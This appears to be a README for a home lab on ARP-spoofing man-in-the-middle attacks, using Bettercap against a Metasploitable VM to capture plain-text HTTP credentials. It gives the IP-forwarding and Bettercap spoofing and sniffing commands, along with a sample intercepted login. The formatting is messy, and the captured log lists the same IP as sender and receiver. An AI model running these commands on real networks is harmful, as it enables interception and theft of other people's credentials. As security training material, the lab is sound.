# Man-in-the-Middle (MITM) Attack Lab

A hands-on lab demonstrating a Layer 2 ARP Spoofing attack to intercept unencrypted network traffic and capture plain-text credentials using Bettercap.

##  Overview

This project simulates a real-world Man-in-the-Middle (MITM) attack on a local network segment. The goal was to position an attacker between a victim client and the network gateway to intercept and analyze all traffic passing through, ultimately capturing login credentials sent over unencrypted protocols.



##  Attack Execution

### Step 1: Enable IP Forwarding
     On the Kali attacker, IP forwarding was enabled to allow traffic to flow through the             machine seamlessly.
     ```bash
     echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

    Step 2: Launch ARP Spoofing Attack
     Bettercap was used to perform ARP cache poisoning against the victim and the gateway.

     bash
     sudo bettercap -iface eth0
     > set arp.spoof.targets 192.168.78.140
     > arp.spoof on
     > net.sniff on

    Step 3: Generate Traffic & Capture Credentials
            From the victim machine, traffic was generated to trigger an HTTP login request.

            bash
            On the Victim VM (Metasploitable 3)
            curl -X POST http://192.168.78.140/payroll_app.php -d                                            "username=admin&password=password"
    Step 4: Intercept Credentials
            The attacker's Bettercap console successfully intercepted the unencrypted HTTP POST              request.

    Intercepted Traffic:

          text
          [http] [192.168.78.140] > [192.168.78.140] "POST /payroll_app.php HTTP/1.1"
          username=admin&password=password

  Results & Evidence
           The attack was successful. The following evidence was collected:

           ARP Poisoning Confirmation: The victim's ARP table was successfully poisoned,                    pointing its gateway route to the attacker's MAC address.

           Traffic Interception: ICMP (ping) requests from the victim to the gateway were                   visibly routed through the attacker's machine.

           Credential Capture: Plain-text credentials (admin:password) were captured from the               HTTP POST request to the vulnerable payroll application.




